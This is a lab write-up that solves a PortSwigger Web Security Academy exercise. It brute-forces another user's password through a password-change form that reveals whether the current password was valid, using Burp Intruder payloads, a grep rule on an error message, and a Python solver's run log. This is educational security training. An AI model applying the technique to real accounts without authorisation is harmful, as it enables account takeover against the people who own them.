# Lab: Password brute-force via password change

### Instructions

This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- Candidate passwords - https://portswigger.net/web-security/authentication/auth-lab-passwords

### Solution

Logging in with the provided credentials a password reset feature is found.

We can fill in these fields and send the request to Burp:

```
POST /my-account/change-password HTTP/2
Host: 0ad7005e04c8f324827098610053005c.web-security-academy.net
Cookie: session=iEem0zhrDZaGP4LW45sXTBC5iYPtAuHD
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: https://0ad7005e04c8f324827098610053005c.web-security-academy.net
Referer: https://0ad7005e04c8f324827098610053005c.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener&current-password=peter&new-password-1=test123&new-password-2=test123
```

What is interesting here is we can update the `username` field, and potentially reset the password of other users.

We can send this request to Intruder, change the `username` to carlos, and then paste in the provided passwords list to be used in a Sniper attack in order to bruteforce user carlos' password.

```
username=carlos&current-password=§test§&new-password-1=test123&new-password-2=test123
```

However kicking off the attack as is, no valid password is found.

What we can do is update the request so the new passwords do not match, which hopefully is not triggered until the `current-password` field is valid.

```
username=carlos&current-password=§test§&new-password-1=testabc&new-password-2=test123
```

We can add a grep match rule to catch the error message the application throws when the new passwords don't match:

```
New passwords do not match
```

Re-running the bruteforce we get a hit:

```
30	000000	200	320	false	false	4114	1	
0		200	333	false	false	4117	0	
1	123456	200	179	false	false	4117	0	
2	password	200	329	false	false	4117	0	
```

We can now login using `carlos:000000` to complete the lab.

```
My Account

Your username is: carlos
```

### Python Solution

See `auth_12.py`

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Authentication/Auth_12_password_brute-force_via_password_change]
└─$ python auth_12.py https://0a39007603228980819ede3f003f007d.web-security-academy.net/ ../candidate_passwords.txt
[+] Target: https://0a39007603228980819ede3f003f007d.web-security-academy.net
[*] Logging in as wiener
[+] Login successful
[*] Bruteforcing carlos' password...
[*] Trying: access              
[+] Password found: yankees
[*] Logging in as carlos
[+] Successfully logged in. Lab solved
```